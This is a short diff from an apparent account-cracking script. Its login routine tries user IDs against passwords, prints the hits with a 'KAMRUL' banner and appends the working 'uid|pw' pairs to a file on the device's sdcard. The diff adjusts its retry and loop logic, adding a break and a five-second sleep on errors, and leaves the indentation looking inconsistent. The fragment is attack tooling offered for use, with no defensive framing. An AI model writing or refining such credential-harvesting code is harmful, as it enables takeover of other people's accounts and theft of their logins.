@@ -514,12 +514,13 @@ def login_2(uid):
                 print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMRUL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/KAMRUL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
-                    
-        except Exception as e:
-            pass
-    loop += 1
+                    loop += 1
+                break
+    except Exception:
+        time.sleep(5)
 
 if __name__ == '__main__':
     BNG_71_()
+
 
 
